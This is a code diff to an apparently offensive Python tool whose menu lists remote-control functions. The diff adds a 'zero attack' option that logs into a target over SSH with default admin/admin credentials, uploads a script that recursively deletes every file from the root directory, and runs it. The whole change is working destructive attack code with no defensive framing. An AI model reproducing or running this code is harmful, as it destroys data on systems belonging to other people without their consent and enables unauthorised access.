@@ -96,6 +96,22 @@ def zero_attack(url_or_ip):
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(url_or_ip, username='admin', password='admin')  # Example credentials
         print(f"Admin access gained on {url_or_ip}")
+
+        # Create a "kill all file" script
+        kill_script = """import os
+for root, dirs, files in os.walk("/"):
+    for file in files:
+        os.remove(os.path.join(root, file))
+"""
+        sftp = client.open_sftp()
+        sftp.file('killallfile.py', 'w').write(kill_script)
+        sftp.close()
+
+        # Execute the script
+        stdin, stdout, stderr = client.exec_command('python3 killallfile.py')
+        stdout.channel.recv_exit_status()
+        print(f"Kill all file script executed on {url_or_ip}")
+
         client.close()
     except Exception as e:
         print(f"Failed to gain admin access on {url_or_ip}: {e}")
@@ -232,10 +248,11 @@ def display_ui():
         [16] View Monitor of Other Computer
         [17] Check Access to Other Computer
         [18] Send and Run Script on Another Computer
-        [19] Exit
+        [19] Admin (zero attack)
+        [20] Exit
         """)
 
-        choice = input("Select the method (1-19): ").strip()
+        choice = input("Select the method (1-20): ").strip()
         ip_address = None
 
         if choice == "1":
@@ -347,6 +364,9 @@ def display_ui():
             remote_script_path = input("Enter the remote path to save the script: ").strip()
             send_and_run_script(ip_address, username, password, local_script_path, remote_script_path)
         elif choice == "19":
+            url_or_ip = input("Enter the URL or IP address to use: ").strip()
+            zero_attack(url_or_ip)
+        elif choice == "20":
             print("Exiting...")
             break
         else:
